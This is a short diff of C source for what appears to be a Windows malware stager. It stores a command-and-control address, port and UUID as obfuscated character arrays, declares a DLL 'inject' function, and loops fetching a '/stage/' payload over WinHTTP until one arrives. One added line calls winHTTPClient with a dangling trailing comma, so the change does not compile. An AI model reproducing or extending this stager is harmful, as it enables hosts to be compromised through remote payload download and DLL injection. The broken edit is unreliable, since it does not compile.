@@ -13,11 +13,11 @@
 #ifndef SERVER_M
 #define SERVER_M '1','9','2','.','1','6','8','.','0','.','1',0
 #endif
-#ifndef PORT
-#define PORT 5001
+#ifndef PORT_M
+#define PORT_M 5001
 #endif
-#ifndef UUID
-#define UUID '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
+#ifndef UUID_M
+#define UUID_M '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
 #endif
 
 HANDLE inject(PAPI api, LPVOID lpDll, DWORD dwDllSize)
@@ -274,7 +274,7 @@ void myMain()
     WCHAR wcStageEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
     while (pEsgStdDll->Buffer == NULL)
     {
-        pEsgStdDll->Buffer = winHTTPClient(api, &pEsgStdDll->Size, wcStageEndpoint);
+        pEsgStdDll->Buffer = winHTTPClient(api, &pEsgStdDll->Size, wcStageEndpoint, );
         ((SLEEP)api->Sleep)(5000);
         if (pEsgStdDll->Buffer != NULL)
         { break; }
